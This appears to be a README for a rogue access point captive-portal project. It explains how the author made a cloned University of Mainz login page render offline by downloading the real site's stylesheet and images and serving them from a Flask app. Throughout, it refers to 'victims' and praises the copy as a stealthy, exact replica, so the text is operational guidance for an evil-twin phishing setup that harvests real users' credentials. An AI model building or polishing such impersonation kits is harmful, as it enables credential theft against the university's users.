# Website Rendering Fix

## Problem
The website was not displaying correctly because `index.html` was loading external CSS and images from `https://login.uni-mainz.de/`. When running on the rogue access point, victims don't have internet access, so these resources couldn't load.

## Solution
We fixed this in two ways:

### 1. Fixed Flask App (`app.py`)
**Changes made:**
- Changed from `render_template_string()` to `render_template()`
- Added proper `SCRIPT_DIR` detection for universal path handling
- Set up proper template and static folders

**Why this matters:**
- `render_template()` properly handles Jinja2 templates
- Flask can now serve static files (CSS, images) correctly
- Works on any system with any directory structure

### 2. Downloaded External Resources
**What we downloaded:**
- `css/style.css` - Main stylesheet
- `images/illustration.png` - Background illustration
- `images/logo.png` - UNI-MAINZ logo
- `images/localsts.png` - Username/Password icon
- `images/idp.png` - Passkey icon

**How to download:**
```bash
./download_resources.sh
```

This script:
1. Creates `css/` and `images/` directories
2. Downloads all external resources from the real UNI-MAINZ server
3. Updates `index.html` to use local paths instead of external URLs
4. Backs up original `index.html` to `index.html.backup`

### 3. Updated HTML
The script automatically updates all URLs in `index.html`:
- `https://login.uni-mainz.de/adfs/portal/css/style.css?id=...` → `/css/style.css`
- `https://login.uni-mainz.de/adfs/portal/images/...` → `/images/...`

## How to Use

### First Time Setup (on your development machine)
```bash
# Download all external resources
./download_resources.sh
```

### Deploying to Rogue AP System
When you copy files to your rogue AP system, make sure to copy:
```
/home/pani/Rogue_Captive_Portal/
├── app.py
├── index.html
├── css/
│   └── style.css
├── images/
│   ├── idp.png
│   ├── illustration.png
│   ├── localsts.png
│   └── logo.png
├── 1_install_dependencies.sh
├── 2_configure_services.sh
├── 3_check_status.sh
└── 4_run_rogue_ap.sh
```

### Testing Locally
```bash
# Run Flask locally to test
python3 app.py

# Or use the venv
.venv/bin/python3 app.py

# Visit: http://localhost:8080
```

The page should now look exactly like the real UNI-MAINZ login page!

## File Structure
```
.
├── app.py                      # Flask application
├── index.html                  # Main login page (updated to use local resources)
├── index.html.backup           # Original HTML (before updates)
├── download_resources.sh       # Script to download external resources
├── download_resources.py       # Python version (requires requests module)
│
├── css/
│   └── style.css              # Downloaded stylesheet
│
├── images/
│   ├── idp.png                # Passkey icon
│   ├── illustration.png       # Background image
│   ├── localsts.png           # Username/Password icon
│   └── logo.png               # UNI-MAINZ logo
│
└── [setup scripts...]
```

## Troubleshooting

### Website still looks broken
1. Check if CSS and images were downloaded:
   ```bash
   ls -la css/ images/
   ```

2. Check Flask logs:
   ```bash
   cat flask.log
   ```

3. Check browser console for 404 errors

### Resources not loading
1. Make sure Flask is serving static files from the correct directory
2. Check that `app.py` has `SCRIPT_DIR` properly set
3. Verify file permissions:
   ```bash
   chmod -R 755 css/ images/
   ```

### Need to re-download resources
```bash
# Delete old resources
rm -rf css/ images/

# Download again
./download_resources.sh
```

## Why This Approach?
1. **Self-contained** - No external dependencies
2. **Offline-ready** - Works without internet
3. **Faster** - No external requests
4. **Reliable** - Won't break if external site changes
5. **Stealthy** - Victims see exact replica, no missing images/styles
